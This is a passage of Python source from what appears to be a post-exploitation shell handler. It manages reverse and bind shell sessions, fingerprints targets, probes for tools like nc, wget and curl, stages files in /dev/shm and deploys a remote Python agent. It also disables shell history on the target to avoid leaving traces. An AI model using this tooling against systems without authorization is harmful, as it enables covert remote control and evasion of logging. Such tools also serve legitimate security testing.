			self._ncat = None

			self.upgrade_attempted = False
			self.upgrade_standalone_attempted = False
			self.standalone_python = None
			self._remote_tarfile = None
			self.uploaded_paths = {}
			self.attaching = False

			core.rlist.append(self)

			if self.determine():
				logger.debug(f"OS: {self.OS}")
				logger.debug(f"Type: {self.type}")
				logger.debug(f"Subtype: {self.subtype}")
				logger.debug(f"Interactive: {self.interactive}")
				logger.debug(f"Echoing: {self.echoing}")

				self.get_system_info()

				if not self.hostname:
					if target == self.ip:
						try:
							self.hostname = socket.gethostbyaddr(target)[0]

						except socket.herror:
							self.hostname = ''
							logger.debug("Cannot resolve hostname")
					else:
						self.hostname = target

				self.hostname = sanitize_meta(self.hostname)
				hostname = self.hostname
				c1 = '~' if hostname else ''
				ip = self.ip
				c2 = '-'
				system = self.system
				if not system:
					system = self.OS.upper()
				if self.arch:
					system += '-' + self.arch

				self.name = f"{hostname}{c1}{ip}{c2}{system}"
				self.name_colored = (
					f"{paint(hostname).white_BLUE} "
					f"{paint(ip).white_RED} "
					f"{paint(system).cyan}"
				)

				if self not in core.rlist:
					return
				self.id = core.new_sessionID
				core.sessions[self.id] = self
				self.ordinal = core.new_session_ordinal

				new_banner = f"[New {self.source.title()} Shell]"
				logger.info(
					f"{paint(new_banner).YELLOW_black} {paint('=>').green} "
					f"{self.name_colored} as {paint(self.user).white_BLUE}"
					f"{paint(' Session ID').green} {paint('<' + str(self.id) + '>').yellow}"
				)

				self.directory = options.basedir / "sessions" / self.name.replace("/", "_")
				self.directory.mkdir(parents=True, exist_ok=True)
				self.histfile = self.directory / "readline_history"
				if not options.no_log:
					log_user = re.sub(r"[\\/]", "_", self.user).replace("(", "_").replace(")", "")
					self.logpath = self.directory / f'{datetime.now().strftime("%Y_%m_%d-%H_%M_%S-%f")[:-3]}-{log_user}.log'
					logfile = open(self.logpath, 'ab', buffering=0)
					self._activate_log(logfile)

				for module in modules().values():
					if module.enabled and module.on_session_start:
						module.run(self, None)

				maintain_success = self.maintain()

				if options.single_session and self.listener:
					self.listener.stop()

				if hasattr(listener_menu, 'active') and listener_menu.active:
					try:
						os.close(listener_menu.control_w)
					except OSError:
						pass
					listener_menu.control_w = None
					listener_menu.finishing.wait()

				attach_conditions = [
					# Is a reverse shell and the Menu is not active and (reached the maintain value or maintain failed)
					self.listener and not menu.active.is_set() and (len(core.hosts[self.name]) == options.maintain or not maintain_success),

					# Is a bind shell and is not spawned from the Menu
					not self.listener and not menu.active.is_set(),

					# Is a bind shell and is spawned from the connect Menu command
					#not self.listener and menu.active.is_set() and menu.lastcmd.startswith('connect') # Never lands here
				]

				# If no other session is attached
				if core.attached_session is None:
					# If auto-attach is enabled
					if not options.no_attach:
						if any(attach_conditions):
							# Attach the newly created session
							self.attach()
					else:
						if self.ordinal == 1:
							menu.set_id(self.id)
						if not menu.active.is_set():
							menu.show()
			else:
				self.kill()
				if not self.listener and core.attached_session is None and not menu.active.is_set():
					menu.show()
				time.sleep(1)
			return

	def __bool__(self):
		return not getattr(self, '_closing', False) and self.socket.fileno() != -1 # and self.OS)

	def __repr__(self):
		try:
			return (
				f"ID: {self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
				f"interactive={self.interactive}, echoing={self.echoing})"
			)
		except AttributeError:
			return f"ID: (for deletion: {self.id})"

	def __getattr__(self, name):
		if name == 'new_streamID':
			with self.stream_lock:
				if getattr(self, '_closing', False):
					return None
				if len(self.streams) == self.streams_max:
					logger.error("Too many open streams...")
					return None

				self.streamID += 1
				self.streamID = self.streamID % self.streams_max
				while struct.pack(self.stream_code, self.streamID) in self.streams:
					self.streamID += 1
					self.streamID = self.streamID % self.streams_max

				_stream_ID_hex = struct.pack(self.stream_code, self.streamID)
				try:
					self.streams[_stream_ID_hex] = Stream(_stream_ID_hex, self)
				except OSError as e:
					logger.error(f"Cannot allocate stream: {e}")
					return None

				return self.streams[_stream_ID_hex]
		else:
			raise AttributeError(name)

	def remove_stream(self, stream):
		with self.stream_lock:
			if self.streams.get(stream.id) is not stream:
				return False
			del self.streams[stream.id]
			return True

	def fileno(self):
		return self.socket.fileno()

	@property
	def can_deploy_agent(self):
		if self._can_deploy_agent is None:
			if not self.standalone_python and Path(self.directory / ".noagent").exists():
				self._can_deploy_agent = False
			else:
				_bin = self.bin['python3'] or self.bin['python']
				if _bin:
					_q = shlex.quote(_bin)
					version = self.exec(f"{_q} -V 2>&1 || {_q} --version 2>&1", value=True)
					try:
						major, minor, micro = re.search(r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
					except Exception:
						self._can_deploy_agent = False
						return self._can_deploy_agent
					self.remote_python_version = (int(major), int(minor), int(micro or 0))
					if self.remote_python_version >= (2, 3): # Python 2.2 lacks: tarfile, os.walk, yield
						# A version match is not enough: minimal python builds
						# can miss agent stdlib modules, producing a
						# half-working agent (e.g. uploads dying on tarfile).
						if self.OS == 'Unix' and self.remote_python_version >= (3,) \
							and not self.remote_agent_imports_ok(_bin):
							logger.warning(
								f"Refusing to deploy the agent with {_bin}: "
								"the remote python misses required stdlib modules. "
								"A standalone python will be offered instead")
							self._can_deploy_agent = False
						else:
							self._can_deploy_agent = True
					else:
						self._can_deploy_agent = False
				else:
					self._can_deploy_agent = False

		return self._can_deploy_agent

	def remote_agent_imports_ok(self, python_bin):
		"""Whether the remote python provides the stdlib modules the agent
		itself needs (pty/fcntl/termios/...). Runs BEFORE deployment, from the
		shell, so it works where exec(python=True) cannot."""
		_q = shlex.quote(python_bin)
		response = self.exec(
			f"{_q} -c \"import pty, fcntl, termios, select, struct, threading, base64, zlib, socket, os, sys\" "
			"2>/dev/null && echo ariadne-imports-ok || echo ariadne-imports-missing",
			value=True
		)
		return isinstance(response, str) and 'ariadne-imports-ok' in response

	@property
	def libc(self):
		if self._libc is None and self.system == 'Linux':
			r = self.exec("ls /lib/ld-musl-* 2>/dev/null | head -1", value=True)
			self._libc = 'musl' if (isinstance(r, str) and 'ld-musl' in r) else 'glibc'
		return self._libc

	@property
	def has_persistent_shell(self):
		if self._has_persistent_shell is None:
			if self.OS != "Unix":
				self._has_persistent_shell = True
			else:
				pid1 = self.exec("echo $$", value=True)
				pid2 = self.exec("echo $$", value=True)
				self._has_persistent_shell = not (
					pid1 and pid2
					and pid1.isdigit() and pid2.isdigit()
					and pid1 != pid2
				)
		return self._has_persistent_shell

	def get_system_info(self):
		self.hostname = self.system = self.arch = ''

		if self.OS == 'Unix':
			if not self.bin['uname']:
				return False

			response = self.exec(
				r'printf "$({0} -n)\t'
				r'$({0} -s)\t'
				r'$({0} -m 2>/dev/null|grep -v unknown||{0} -p 2>/dev/null)"'.format(self.bin['uname']),
				agent_typing=True,
				value=True
			)

			try:
				self.hostname, self.system, self.arch = (sanitize_meta(x) for x in response.split("\t"))
			except Exception:
				return False

		elif self.OS == 'Windows':
			self.systeminfo = self.exec('systeminfo', value=True)
			if not self.systeminfo:
				return False
			self.systeminfo = self.systeminfo.replace('\r\n', '\n').replace('\r', '\n')
			self.systeminfo = re.sub(r'\x1b\[[0-?]*[ -/]*[@-~]', '', self.systeminfo)

			def extract_value(pattern):
				match = re.search(pattern, self.systeminfo, re.MULTILINE)
				return match.group(1).replace(" ", "_").rstrip() if match else ''

			self.hostname = sanitize_meta(extract_value(r"^Host Name:\s+(.+)"))
			self.system = sanitize_meta(extract_value(r"^OS Name:\s+(.+)"))
			self.arch = sanitize_meta(extract_value(r"^System Type:\s+(.+)"))

		return True

	def get_shell_info(self, silent=False):
		self.shell_pid = self.get_shell_pid()
		self.user = self.get_user()
		if self.OS == 'Unix':
			self.tty = self.get_tty(silent=silent)

	def get_shell_pid(self):
		if self.OS == 'Unix':
			response = self.exec("echo $$", agent_typing=True, value=True)

		elif self.OS == 'Windows':
			return None

		if not (isinstance(response, str) and response.isnumeric()):
			logger.error(f"Cannot get the PID of the shell...")
			return False
		return response

	def get_user(self):
		if self.OS == 'Unix':
			response = self.exec("echo \"$(id -un)($(id -u))\"", agent_typing=True, value=True)

		elif self.OS == 'Windows':
			response = self.exec("whoami", force_cmd=True, value=True)
			if response:
				if "\n" in response:
					response = response.splitlines()[-1] # conptyshell
				if '\x07' in response:
					response = response.split('\x07')[-1] # conptyshell cmd

		return sanitize_meta(response) if response else ''

	def write_access(self, directory):
		try:
			if self.OS == 'Unix':
				if self.agent:
					if not self.exec(
						f"stdout_stream << str(os.access(normalize_path({directory!r}), os.W_OK)).encode()",
						python=True,
						value=True
					) == 'True':
						logger.error(f"{directory}: Permission denied")
						return False
				else:
					access = self.exec(f"[ -w {shlex.quote(directory)} ];echo $?", value=True)
					if not (isinstance(access, str) and access.strip().isdigit()):
						logger.error(f"Cannot check write permissions for {directory}. Aborting...")
						return None
					if int(access):
						logger.error(f"{directory}: Permission denied")
						return False

			elif self.OS == 'Windows':
				write_test_file = str(PureWindowsPath(directory) / f"{rand(16)}.tmp")
				cmd = (
					f'type nul > "{write_test_file}" 2>nul && (echo OK) || (echo NO) '
					f'& del /f /q "{write_test_file}" 2>nul'
				)
				response = self.exec(cmd, force_cmd=True, value=True)
				if response != "OK":
					logger.error(f"{directory}: Access is denied.")
					return False

		except Exception as e:
			logger.error(e)
			logger.warning("Cannot check remote permissions. Aborting...")
			return None

		return True

	def resolve_remote_path(self, path):
		if self.OS != 'Unix':
			return path
		resolved = self.exec(
			f"_p={shell_expand_remote_path(path)} && "
			f'case "$_p" in /*) cd "$_p";; *) cd {shlex.quote(self.cwd)} 2>/dev/null '
			f'&& cd "$_p";; esac 2>/dev/null && pwd -P',
			value=True
		)
		return resolved if isinstance(resolved, str) and resolved.startswith('/') else None

	def get_remote_completion(self, text):
		"""
		Obtain file and directory completions from the remote shell.
		"""
		text = text if text else ""

		try:
			if self.agent:
				code = (
					f"import glob, os; "
					f"matches = glob.glob({(text + '*')!r}); "
					f"result = '\\n'.join([p + '/' if os.path.isdir(p) else p for p in matches]); "
					f"stdout_stream << result.encode()"
				)
				result = self.exec(code, python=True, value=True)
				if result:
					return result.splitlines()

			elif self.OS == 'Unix':
				safe_pattern = shlex.quote(text) + "*"
				cd = f"cd {shlex.quote(self.cwd)} 2>/dev/null; " if self.cwd else ""
				cmd = f"{cd}ls -p -1 -d {safe_pattern} 2>/dev/null"
				result = self.exec(cmd, value=True)
				if result:
					return result.splitlines()

			elif self.OS == 'Windows':
				win_text = text.replace('/', '\\')
				sep = "ARIADNE_SEP"
				cmd = (f'dir /b /ad "{win_text}*" 2>NUL & echo {sep}'
				       f' & dir /b /a-d "{win_text}*" 2>NUL')
				result = self.exec(cmd, force_cmd=True, value=True)

				if result:
					cut = max(text.rfind('/'), text.rfind('\\'))
					head = text[:cut + 1]
					dirs_part, _, files_part = result.partition(sep)
					bad = ("File Not Found", "The system cannot find", "Volume in drive", "Directory of")
					matches = []
					for name in dirs_part.splitlines():
						name = name.strip()
						if name and not any(b in name for b in bad):
							matches.append(head + name + "\\")
					for name in files_part.splitlines():
						name = name.strip()
						if name and not any(b in name for b in bad):
							matches.append(head + name)
					return matches
		except Exception:
			pass

		return []

	def get_tty(self, silent=False):
		response = self.exec("tty", agent_typing=True, value=True) # TODO check binary
		if not (isinstance(response, str) and response.startswith('/')):
			if not silent:
				logger.error(f"Cannot get the TTY of the shell. Response:\r\n{paint(response).white}")
			return False
		return response

	@property
	def cwd(self):
		if self._cwd is None:
			if self.OS == 'Unix':
				cmd = (
				    f"readlink /proc/{self.shell_pid}/cwd 2>/dev/null || "
				    f"lsof -p {self.shell_pid} 2>/dev/null | awk '$4==\"cwd\" {{print $9;exit}}' | grep . || "
				    f"procstat -f {self.shell_pid} 2>/dev/null | awk '$3==\"cwd\" {{print $NF;exit}}' | grep . || "
				    f"pwdx {self.shell_pid} 2>/dev/null | awk '{{print $2;exit}}' | grep ."
				)
				self._cwd = self.exec(cmd, value=True)
			elif self.OS == 'Windows':
				self._cwd = self.exec("cd", force_cmd=True, value=True)
		return self._cwd or ''

	@property
	def is_attached(self):
		return core.attached_session is self

	@property
	def bin(self):
		if not self._bin:
			binaries = []
			try:
				if self.OS == "Unix":
					binaries = [
						"sh", "bash", "python", "python3", "uname",
						"tty", "echo", "base64", "wget", "curl", "tar",
						"rm", "stty", "find", "nc", "gzip", "chmod",
						"tr", "sed", "stat", "awk", "tail", "cut", "df", "id", "du",
						"cat", "mkfifo", "grep", "mktemp"
					]
					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
					if response:
						self._bin.update(zip(binaries, response.decode(errors="replace").splitlines()))

					missing = [b for b in binaries if not os.path.isabs(self._bin[b])]

					if missing:
						logger.debug(paint(f"We didn't find the binaries: {missing}. Trying another method").red)
						response = self.exec(
							f'for bin in {" ".join(missing)}; do for dir in '
							f'$(printf %s "$PATH" | tr ":" " ") '
							f'{" ".join(LINUX_PATH.split(":"))}; do _bin=$dir/$bin; '
							'test -x "$_bin" && break || unset _bin; done; echo "$_bin"; done'
						)
						if response:
							self._bin.update(dict(zip(missing, response.decode(errors="replace").splitlines())))

				for binary in options.no_bins:
					self._bin[binary] = None

				result = "\n".join([f"{b}: {self._bin[b]}" for b in binaries])
				logger.debug(f"Available binaries on target: \n{paint(result).red}")
			except Exception as e:
				logger.error(f"Binary discovery failed: {e}")

		return self._bin

	@property
	def tmp(self):
		if self._tmp is None:
			if self.OS == "Unix":
				logger.debug("Trying to find a writable directory on target")
				name = rand(10)
				resolved = self.exec(
					'for d in /dev/shm /tmp /var/tmp "$HOME" .; do '
					f'(echo x > "$d/{name}") 2>/dev/null && '
					f'{{ (cd "$d" && pwd); rm -f "$d/{name}"; break; }}; done',
					value=True)
				self._tmp = resolved if (isinstance(resolved, str) and resolved.startswith("/")) else False
				if not self._tmp:
					logger.warning(
						"No writable directory found. Find one with:\n"
						"    find / -type d -writable 2>/dev/null | head\n"
						"then `cd` into it and retry.")
				else:
					logger.debug(f"Available writable directory on target: {paint(self._tmp).RED}")

			elif self.OS == "Windows":
				self._tmp = self.exec("echo %TEMP%", force_cmd=True, value=True)

		return self._tmp

	@property
	def exec_tmp(self):
		if self._exec_tmp is None and self.OS == "Unix":
			name = rand(10)
			resolved = self.exec(
				'for d in /dev/shm /tmp /var/tmp "$HOME" .; do '
				f'D="$d/{name}"; mkdir -p "$D" 2>/dev/null || continue; '
				# '#!/bin/sh' must be single-quoted: interactive bash history-
				# expansion mangles double-quoted `!` ("event not found") and
				# the probe then fails on every target.
				"{ echo '#!/bin/sh'; echo 'exit 0'; } > \"$D/t\" 2>/dev/null && "
				'chmod +x "$D/t" 2>/dev/null && "$D/t" >/dev/null 2>&1 && '
				'{ (cd "$d" && pwd); rm -rf "$D"; break; }; rm -rf "$D" 2>/dev/null; done',
				value=True)
			if isinstance(resolved, str) and resolved.startswith("/"):
				self._exec_tmp = resolved
			else:
				logger.warning(
					"No writable+executable directory found (noexec?). Find one with:\n"
					"    find / -type d -writable -executable 2>/dev/null | head\n"
					"then `cd` into it and retry.")
		return self._exec_tmp

	def agent_only(func):
		@wraps(func)
		def newfunc(self, *args, **kwargs):
			if not self.agent:
				if not self.upgrade_attempted and self.can_deploy_agent:
					logger.warning("This can only run in python agent mode. I am trying to deploy the agent")
					self.upgrade()
					if not self.agent:
						logger.error("Failed to deploy agent")
						return False
				else:
					logger.error("This can only run in python agent mode")
					return False
			return func(self, *args, **kwargs)
		return newfunc

	def persistent_shell_only(func):
		@wraps(func)
		def newfunc(self, *args, **kwargs):
			if not self.agent and not self.has_persistent_shell:
				logger.error(
					"This shell runs each command in a fresh process; "
					f"'{func.__name__}' needs a persistent shell. Run 'spawn' "
					"and use the resulting session."
				)
				return []
			return func(self, *args, **kwargs)
		return newfunc

	def prefer_agent(func):
		@wraps(func)
		def newfunc(self, *args, **kwargs):
			if (not self.agent
					and not self.upgrade_attempted
					and not options.no_upgrade
					and self.can_deploy_agent):
				logger.debug(f"'{func.__name__}' prefers the agent; attempting upgrade")
				self.upgrade()
			return func(self, *args, **kwargs)
		return newfunc

	def require(*binaries):
		def inner(func):
			@wraps(func)
			def newfunc(self, *args, **kwargs):
				if self.OS == 'Unix' and not self.agent:
					for binary in binaries:
						if not self.bin[binary]:
							logger.error(f"'{binary}' binary is not available at the target. Cannot {func.__name__}...")
							return []
				return func(self, *args, **kwargs)
			return newfunc
		return inner

	def tcp_signal(self):
		TCP_INFO = getattr(socket, 'TCP_INFO', None)
		if TCP_INFO is None:
			return None
		try:
			buf = self.socket.getsockopt(socket.IPPROTO_TCP, TCP_INFO, 104)
		except OSError:
			return None
		if len(buf) < 104:
			return None
		rtt     = struct.unpack_from('I', buf, 68)[0] / 1000.0
		jitter  = struct.unpack_from('I', buf, 72)[0] / 1000.0
		retrans = struct.unpack_from('I', buf, 100)[0]
		return rtt, jitter, retrans

	def send(self, data, stdin=False):
		with self.wlock:
			if not self in core.rlist:
				return False

			self.outbuf.seek(0, io.SEEK_END)
			_len = self.outbuf.write(data)

			if self not in core.wlist:
				core.wlist.append(self)
				if not stdin:
					core.control << None
			return _len

	def record(self, data, _input=False):
		self.last_lines << data
		if not options.no_log:
			self.log(data, _input)

	def log(self, data, _input=False):
		#data=re.sub(rb'(\x1b\x63|\x1b\x5b\x3f\x31\x30\x34\x39\x68|\x1b\x5b\x3f\x31\x30\x34\x39\x6c)', b'', data)
		data = re.sub(rb'\x1b\x63', b'', data) # Need to include all Clear escape codes

		if _input:
			data = re.sub(rb'[^\r\n]+',
				lambda m: str(paint(m.group().decode(errors="replace")).GREEN_white).encode(), data)

		if not options.no_timestamps:
			timestamp = datetime.now().strftime(LOG_TIMESTAMP_FMT)
			if not options.no_colored_timestamps:
				timestamp = paint(timestamp).magenta
			data = re.sub(rb'\r\n|\r|\n|\v|\f', rf"\g<0>{timestamp}".encode(), data)
		with self.log_lock:
			try:
				self.logfile.write(data)
			except ValueError:
				logger.debug("The session killed abnormally")

	def _activate_log(self, logfile):
		with self.log_lock:
			if self.logfile.closed:
				logfile.close()
				return False
			if not options.no_timestamps:
				logfile.write(str(paint(datetime.now().strftime(LOG_TIMESTAMP_FMT)).magenta).encode())
			logfile.write(self.logfile.getvalue())
			self.logfile.close()
			self.logfile = logfile
			return True

	def determine(self, path=False):

		var_name1, var_name2, var_value1, var_value2 = (rand(4) for _ in range(4))

		def expect(data):
			data = data.decode(errors="replace")

			if var_value1 + var_value2 in data:
				return True
			elif f"'{var_name1}' is not recognized as an internal or external command" in data:
				return re.search('batch file.\r\n', data, re.DOTALL)
			elif re.search(r'PS[^\r\n]*>', data, re.DOTALL):
				return True
			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in data:
				return re.search('or operable.*>', data, re.DOTALL)
			elif re.search('Microsoft Windows.*>', data, re.DOTALL):
				return True
			elif re.search(r'(?<!PS )[A-Za-z]:\\[^\r\n]*>\s*$', data):
				return True

		response = self.exec(
			f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}\n",
			raw=True,
			expect_func=expect
		)

		if response:
			response = response.decode(errors="replace")

			if var_value1 + var_value2 in response:
				self.OS = 'Unix'
				self.echoing = f"echo ${var_name1}${var_name2}" in response
				echoed_cmd = f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}"
				if self.echoing and echoed_cmd in response:
					head = response.split(echoed_cmd, 1)[0]
				else:
					head = response.split(var_value1 + var_value2, 1)[0]
				self.interactive = bool(head.strip())
				self.prompt = head.splitlines()[-1].encode() if self.interactive else b""
				if not options.keep_history:
					self.exec("export HISTFILE=/dev/null HISTCONTROL=ignorespace 2>/dev/null")

			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response or \
					re.search(r'PS[^\r\n]*>', response, re.DOTALL):
				self.OS = 'Windows'
				self.type = 'Raw'
				self.subtype = 'psh'
				self.interactive = True
				self.echoing = False
				self.prompt = response.splitlines()[-1].encode()

			elif f"'{var_name1}' is not recognized as an internal or external command" in response or \
					re.search('Microsoft Windows.*>', response, re.DOTALL) or \
					re.search(r'(?<!PS )[A-Za-z]:\\[^\r\n]*>\s*$', response):
				self.OS = 'Windows'
				self.type = 'Raw'
				self.subtype = 'cmd'
				self.interactive = True
				self.echoing = True
				prompt = re.search(r"\r\n\r\n([a-zA-Z]:\\.*>)", response, re.MULTILINE)
				self.prompt = prompt[1].encode() if prompt else b""
				win_version = re.search(r"Microsoft Windows \[.* (.*)\]", response, re.DOTALL)
				if win_version:
					self.win_version = win_version[1]

		else:
			return False

		if self.OS == 'Windows' and response and '\x1b' in response:
			self.type = 'PTY'
			self.echoing = True
			if self.subtype == 'psh':
				columns, lines = shutil.get_terminal_size()
				cmd = (
					f"$width={columns}; $height={lines}; "
					"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
					"$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
					"-ArgumentList ($width, $height)"
				)
				self.exec(cmd)
			self.prompt = response.split()[-1].encode()

		self.get_shell_info(silent=True)
		if self.tty:
			self.type = 'PTY'
		if self.type == 'PTY':
			self.pty_ready = True
		return True

	def exec(
		self,
		cmd=None, 		# The command line to run
		raw=False, 		# Delimiters
		value=False,		# Will use the output elsewhere?
		timeout=False,		# Timeout
		expect_func=None,	# Function that determines what to wait for in the response
		force_cmd=False,	# Execute cmd command from powershell
		separate=False,		# If true, send cmd via this method but receive with TLV method (agent)
					# --- Agent only args ---
		agent_typing=False,	# Simulate typing on shell
		python=False,		# Execute python command
		stdin_src=None,		# stdin stream source
		stdout_dst=None,	# stdout stream destination
		stderr_dst=None,	# stderr stream destination
		stdin_stream=None,	# stdin_stream object
		stdout_stream=None,	# stdout_stream object
		stderr_stream=None,	# stderr_stream object
		agent_control=None	# control queue
	):
		if self.agent and not agent_typing: # Environment will not be the same as the PTY shell
			if cmd:
				cmd = dedent(cmd)
				cmd_bytes = cmd.encode()
				max_cmd = Messenger.MAX_PAYLOAD - 1 - 3 * Messenger.STREAM_BYTES
				if len(cmd_bytes) > max_cmd:
					logger.error(f"Command too long for agent: {len(cmd_bytes)} bytes (max {max_cmd})")
					return
				if value:
					buffer = io.BytesIO()
				timeout = self.timeout_short if value else None

				own_stdin = stdin_stream is None
				own_stdout = stdout_stream is None
				own_stderr = stderr_stream is None
				allocated_streams = []

				def cleanup_allocated_streams():
					for stream in allocated_streams:
						stream.close()
						self.remove_stream(stream)

				if not stdin_stream:
					stdin_stream = self.new_streamID
					if not stdin_stream:
						cleanup_allocated_streams()
						return
					allocated_streams.append(stdin_stream)
				if not stdout_stream:
					stdout_stream = self.new_streamID
					if not stdout_stream:
						cleanup_allocated_streams()
						return
					allocated_streams.append(stdout_stream)
				if not stderr_stream:
					stderr_stream = self.new_streamID
					if not stderr_stream:
						cleanup_allocated_streams()
						return
					allocated_streams.append(stderr_stream)

				_type = 'S'.encode() if not python else 'P'.encode()
				self.send(Messenger.message(
					Messenger.EXEC, _type +
					stdin_stream.id +
					stdout_stream.id +
					stderr_stream.id +
					cmd_bytes
				))
				logger.debug(cmd)
				#print(stdin_stream.id, stdout_stream.id, stderr_stream.id)

				rlist = []
				if stdin_src:
					rlist.append(stdin_src)
				if stdout_dst or value:
					rlist.append(stdout_stream)
				if stderr_dst or value:
					rlist.append(stderr_stream) # FIX
				if not rlist:
					if own_stdin:
						try:
							stdin_stream.write(b"")
						except OSError:
							pass
					cleanup_allocated_streams()
					return True

				if not agent_control:
					agent_control = self.subchannel.control # TEMP
				rlist.append(agent_control)

				def _selectable(x):
					try:
						select([x], [], [], 0)
						return True
					except (ValueError, OSError):
						return False

				pending = {}
				closing = set()

				# 'rlist and' guards against selecting on nothing with timeout=None
				# (forever): once every stream died the loop must end, not just
				# when only agent_control is left.
				while rlist and rlist != [agent_control]:
					wlist = [dst for dst in pending if pending[dst]]
					try:
						r, w, _ = select(rlist, wlist, [], timeout)
					except (ValueError, OSError):
						rlist = [x for x in rlist if _selectable(x)]
						if not rlist or rlist == [agent_control]:
							break
						continue

					timeout = None

					for dst in w:
						try:
							pending[dst] = pending[dst][dst.send(pending[dst]):]
						except BlockingIOError:
							pass
						except OSError:
							pending[dst] = b""
							closing.add(dst)

					for dst in tuple(closing):
						if not pending.get(dst):
							if dst in rlist:
								rlist.remove(dst)
							closing.discard(dst)

					if not r and not w:
						break # timeout

					for readable in r:

						if readable is agent_control:
							command = agent_control.get()
							if command == 'stop':
								# TODO kill task here...
								break

						if readable is stdin_src:
							if hasattr(stdin_src, 'read'): # FIX
								data = stdin_src.read(options.network_buffer_size)
							elif hasattr(stdin_src, 'recv'):
								try:
									data = stdin_src.recv(options.network_buffer_size)
								except BlockingIOError:
									continue
								except OSError:
									data = b""
							else:
								data = b""
							stdin_stream.write(data)
							if not data:
								if stdin_src in rlist:
									rlist.remove(stdin_src)

						if readable is stdout_stream:
							data = readable.read(options.network_buffer_size)
							if value:
								buffer.write(data)
							elif stdout_dst:
								if hasattr(stdout_dst, 'write'): # FIX
									stdout_dst.write(data)
									stdout_dst.flush()
								elif data:
									pending[stdout_dst] = pending.get(stdout_dst, b"") + data
								else:
									closing.add(stdout_dst)
							if not data:
								rlist.remove(readable)
								self.remove_stream(readable)

						if readable is stderr_stream:
							data = readable.read(options.network_buffer_size)
							if value:
								buffer.write(data)
							elif stderr_dst:
								if hasattr(stderr_dst, 'write'): # FIX
									stderr_dst.write(data)
									stderr_dst.flush()
								elif data:
									pending[stderr_dst] = pending.get(stderr_dst, b"") + data
								else:
									closing.add(stderr_dst)
							if not data:
								rlist.remove(readable)
								self.remove_stream(readable)
					else:
						continue
					break

				try:
					stdin_stream.write(b"")
				except OSError:
					pass
				for stream in (stdin_stream, stdout_stream, stderr_stream):
					stream.close()
					self.remove_stream(stream)

				return buffer.getvalue().rstrip().decode(errors="replace") if value else True
			return None

		with self.lock:

			if not self or not self.subchannel.can_use:
				logger.debug("Exec: The session is killed")
				return False

			self.subchannel.control.clear()
			with self.data_route_lock:
				self.subchannel.active = True
			self.subchannel.result = None
			buffer = io.BytesIO()
			_start = time.perf_counter()

			# Constructing the payload
			if cmd is not None:
				if force_cmd and self.subtype == 'psh':
					cmd_b64 = base64.b64encode(cmd.encode()).decode()
					cmd = (
						f"$c=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{cmd_b64}'));"
						"& $env:ComSpec /d /s /c $c"
					)
				initial_cmd = cmd
				cmd = cmd.encode()

				if raw:
					if self.OS == 'Unix':
						echoed_cmd_regex = rb' ' + re.escape(cmd) + rb'\r?\n'
						cmd = b' ' + cmd + b'\n'

					elif self.OS == 'Windows':
						cmd = cmd + b'\r\n'
						echoed_cmd_regex = re.escape(cmd)
				else:
					token = [rand(10) for _ in range(4)]

					if self.OS == 'Unix':
						# A command ending in &, | or ; cannot take a `;` separator
						# (`nohup x &;printf` is a bash syntax error and rejects the
						# whole line — the background job never starts); after those
						# operators the marker printf follows after a plain space.
						sep = ' ' if initial_cmd.rstrip().endswith(('&', '|', ';')) else ';'
						cmd = (
							f" {token[0]}={token[1]} {token[2]}={token[3]};"
							f"printf ${token[0]}${token[2]};"
							f"{initial_cmd}{sep}"
							f"printf ${token[2]}${token[0]}\n".encode()
						)

					elif self.OS == 'Windows': # TODO fix logic
						if self.subtype == 'cmd':
							cmd = (
								f"set {token[0]}={token[1]}&set {token[2]}={token[3]}\r\n"
								f"echo %{token[0]}%%{token[2]}%&{initial_cmd}&"
								f"echo %{token[2]}%%{token[0]}%\r\n".encode()
							)
						elif self.subtype == 'psh':
							cmd = (
								f"$env:{token[0]}=\"{token[1]}\";$env:{token[2]}=\"{token[3]}\"\r\n"
								f"echo $env:{token[0]}$env:{token[2]};{initial_cmd};"
								f"echo $env:{token[2]}$env:{token[0]}\r\n".encode()
							)
						# TODO check the maxlength on powershell
						if self.subtype == 'cmd' and len(cmd) > MAX_CMD_PROMPT_LEN:
							logger.error(f"Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters")
							return False

					self.subchannel.pattern = re.compile(
						rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
						rf"{'.' if self.interactive else ''}".encode(), re.DOTALL)

				logger.debug(f"\n\n{paint(f'Command for session {self.id}').YELLOW}: {initial_cmd}")
				logger.debug(f"{paint('Command sent').yellow}: {cmd.decode()}")
				if self.agent and agent_typing:
					cmd = Messenger.message(Messenger.SHELL, cmd)
				self.send(cmd)

			data_timeout = self.timeout_short if timeout is False else timeout
			continuation_timeout = options.latency
			timeout = data_timeout

			last_data = time.perf_counter()
			need_check = False
			first_byte = True
			try:
				while self.subchannel.result is None:
					logger.debug(paint(f"Waiting for data (timeout={timeout})...").blue)
					readables, _, _ = select([self.subchannel.control, self.subchannel], [], [], timeout)

					if self.subchannel.control in readables:
						command = self.subchannel.control.get()
						logger.debug(f"Subchannel Control Queue: {command}")

						if command == 'stop':
							self.subchannel.result = False
							break

					if self.subchannel in readables:
						now = time.perf_counter()
						if first_byte:
							rtt = now - last_data
							self.latency = rtt if self.latency is None else 0.7 * self.latency + 0.3 * rtt
							first_byte = False
						logger.debug(f"Latency: {now - last_data}")
						last_data = now

						data = self.subchannel.read()
						buffer.write(data)
						logger.debug(f"{paint('Received').GREEN} -> {data}")

						if timeout == data_timeout:
							timeout = continuation_timeout
							need_check = True

					else:
						if timeout == data_timeout:
							logger.debug(paint("TIMEOUT").RED)
							self.subchannel.result = False
							break
						else:
							need_check = True
							timeout = data_timeout

					if need_check:
						need_check = False

						if raw and self.echoing and cmd:
							result = buffer.getvalue()
							if re.search(echoed_cmd_regex + (b'.' if self.interactive else b''), result, re.DOTALL):
								self.subchannel.result = re.sub(echoed_cmd_regex, b'', result)
								break
							else:
								logger.debug("The echoable is not exhausted")
								continue
						if not raw:
